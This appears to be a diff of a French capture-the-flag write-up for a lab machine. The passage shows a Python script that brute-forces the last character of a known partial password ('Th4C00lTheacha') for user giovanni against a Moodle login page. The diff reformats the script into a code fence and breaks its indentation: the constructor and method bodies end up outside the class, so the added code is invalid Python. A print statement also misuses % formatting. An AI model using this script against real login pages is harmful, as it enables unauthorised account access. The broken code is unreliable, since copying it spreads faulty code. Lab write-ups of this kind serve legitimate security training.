@@ -68,44 +68,46 @@ Donc comme vous pouvez le voir c'est un fichier assez inhabituel donc on va voir
     
 Effectivement si nous avons des informations et que dans le mot de passe Th4C00lTheacha il manque un caractère à la fin du coup donc ce mot de passe peut correspondre au CMS /moodle donc l'utilisateur est Giovanni et le mot de passe Th4C00lTheacha?. Donc pour cela j'ai développé un script en Python pour essayer de trouver le dernier caractère du mot de passe en question.
 
-    #!/usr/bin/env python 
-    #coding:utf-8
+```python
+#!/usr/bin/env python 
+#coding:utf-8
 
-    import requests
-    import sys
-    import re
+import requests
+import sys
+import re
 
-    class Teacher:
-        def __init__(self, target="http://10.10.10.153/", path="moodle/login/index.php",
+class Teacher:
+    def __init__(self, target="http://10.10.10.153/", path="moodle/login/index.php",
                                            end_pass=None):
 
-            '''
-                This function will create
-                the variables by defaults and testing.
-            '''
+    '''
+        This function will create
+        the variables by defaults and testing.
+    '''
 
-            self.target_url   = target
-            self.path_url     = path
-            self.end_password = end_pass
+    self.target_url   = target
+    self.path_url     = path
+    self.end_password = end_pass
 
-        def send_req(self):
-            '''
-                This feature will handle the attack
-                and send the passwords and test them in function send_req()
-            '''
-            self.end_password = ["*", "=", "!", "/", "_", "1", "2", "3", "4", "5", "6", "7", "8", "9", "#", "+"]
+    def send_req(self):
+    '''
+        This feature will handle the attack
+        and send the passwords and test them in function send_req()
+    '''
+    self.end_password = ["*", "=", "!", "/", "_", "1", "2", "3", "4", "5", "6", "7", "8", "9", "#", "+"]
 
-            for convert_password in self.end_password:
-                plain_password = "Th4C00lTheacha" + convert_password.strip("\n")
-                plain_requests = {"anchor":"", "username":"giovanni", "password":plain_password, "rememberusername":"1"}
+    for convert_password in self.end_password:
+        plain_password = "Th4C00lTheacha" + convert_password.strip("\n")
+        plain_requests = {"anchor":"", "username":"giovanni", "password":plain_password, "rememberusername":"1"}
 
-                req_http = requests.post(self.target_url + self.path_url, data=plain_requests).text
-                if("Invalid login" in "".join(req_http))     :  print("[-] Password not cracked : %s") %(plain_password)
-                if not("Invalid login" in "".join(req_http)) :  print("\n[+] Password cracked with success : %s\n" %(plain_password)), sys.exit(0)
-
-    if __name__ == "__main__":
-        req = Teacher()
-        req.send_req()
+        req_http = requests.post(self.target_url + self.path_url, data=plain_requests).text
+        if("Invalid login" in "".join(req_http))     :  print("[-] Password not cracked : %s") %(plain_password)
+        if not("Invalid login" in "".join(req_http)) :  print("\n[+] Password cracked with success : %s\n" %(plain_password)), sys.exit(0)
+        
+if __name__ == "__main__":
+    req = Teacher()
+    req.send_req()
+```
 
 Donc si nous lançons le script :
 
